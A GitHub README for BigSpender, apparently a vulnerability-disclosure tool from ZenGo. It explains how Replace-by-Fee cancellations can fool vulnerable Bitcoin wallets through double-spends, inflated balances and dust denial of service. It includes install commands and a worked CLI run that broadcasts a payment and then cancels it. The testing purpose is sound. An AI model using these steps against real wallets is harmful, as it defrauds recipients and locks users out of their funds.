# BigSpender
A tool for checking the BigSpender vulnerability in Bitcoin wallets.
This repository gathers a set of scripts for double spending at zero-confirmations, using Bitcoin's [Replace-by-Fee](https://github.com/bitcoin/bips/blob/master/bip-0125.mediawiki).<br> 
For some vulnerable wallets, it allows a malicious sender to perform the following attacks:
1. **Basic double-spend**: Attackers can exploit this problem by sending a victim a transaction of some value but with minimal fees (will be pending for a long time) and asking for some goods or services in return, then canceling the transaction immediately. Since the vulnerable wallets do not reflect cancellations and still show an incorrect balance, the victim will see their wallet’s balance has increased and believe the transaction to be complete. Therefore, the victim may provide the attacker with the goods or services without actually receiving any payment. 
Note: Unlike other double spend schemes, this scheme is easy to use, and totally deterministic (no race conditions). It requires almost no financial investment on behalf of the attacker (besides negligible fees) and does not require any additional preconditions.

2. **Amplified attack**: The problem can be further amplified by an attacker. A series of such replaceable transactions can be created to artificially inflate a victim’s balance and expand the attack. For example, attackers with only $10 possessions can increase a balance by $1K, by sending a series of 100 transactions of $10, each cancelling the prior transaction.

3. **Denial of Service**: Even if a wallet owner is not fooled by this attack, they cannot “send all” their holdings as the presented balance is now higher than the actual balance. When they try to send all, it fails. This fact also disables other kinds of sending attempts (e.g. sending only a fraction of the wallet's balance) if the wallet’s coin selection algorithm chooses funds from this nonexistent transaction.<br>
Attackers can do a mass “BigSpender” DoS by sending a tiny amount (“dust”) to many users of a vulnerable wallet and cancel it (so it does not require a lot of capital). The consent of victims is not required, and they are now unable to use their funds.<br>

It was also found that in some wallets __recovery is hard__ - even after uninstalling and reinstalling the wallet software, restoring from the same seed results with the same false balance and inability to send.<br>
You can read more [here](https://zengo.com/bigspender-double-spend-vulnerability-in-bitcoin-wallets/).

## Usage

1. Install:
```
$ git clone https://github.com/KZen-networks/big-spender
$ cd ./big-spender
$ chmod +x index
$ yarn install
```

2. Set environment variable for the private key.<br>
It should have at least one UTXO of a sufficient balance (0.001 BTC should be enough, testnet supported).<br>
If you do not have such private key already, follow short instructions [here](set-private-key.md) instead.
```
$ export PRIVATE_KEY=<32 bytes hex>
```

3. Use the CLI tool:
```
$ ./index --help
Usage: index [options] [command]

Options:
  -h, --help                    display help for command

Commands:
  address|a [options]           Generate a random Bitcoin address
  rbf [options]                 Send N transactions: each replaces the previous one with a higher fee. Last one goes back to sender.
  listen|l [options] <address>  Listen for changes in the transactions history of the given address
  signing-address|sa [options]  Get the address of the signing private key
  help [command]                display help for command
```

## Example
Use 2 shells.
1. The first shell will simulate the victim's wallet. Generate a random address (for every CLI method, use mainnet by appending `-n mainnet`):
```
$ ./index address
tb1qtdcxk5x8yqa2phx2xpevhvtv4eyg2ngslmq0ga
```
Then, listen for history changes (incoming/outgoing transactions activity) on this address:
```
$ ./index listen tb1qtdcxk5x8yqa2phx2xpevhvtv4eyg2ngslmq0ga
Listening for changes...
```
2. The second shell will simulate the attacker. Remember to first set the `PRIVATE_KEY` environment variable.<br>
Then, use the Replace-by-Fee method to create K transactions (by default K = 2).<br> 
The first (K - 1) transactions will send to the address we've just created, and the last one will go back to the sender.
```
$ ./index rbf --toAddress=tb1qpqrjep77dn9asqqx5e6rzntdx9egu7ml3tggad
broadcasting #0...
txid #0: 6853984d159dfca63957bf04ebef3a0d1c9d7adf1fabfa8b1e1d242db8faaa79
broadcasting #1 back to the sender...
txid #1: e6d8bcceb33af3de5d478715364c44642ce61a45ca259921b759d52bf08ebbf0
```
3. Go back to the first shell, and see the changes:
```
----------
history changed!
historyTxs = [ { height: 0,
    tx_hash:
     '6853984d159dfca63957bf04ebef3a0d1c9d7adf1fabfa8b1e1d242db8faaa79' } ]
----------
history changed!
historyTxs = []
```

Example for using the tool to verify the vulnerability does not apply (ZenGo wallet):
<p align="center">
 <img src="https://raw.githubusercontent.com/KZen-networks/big-spender/master/demo.gif">
</p>

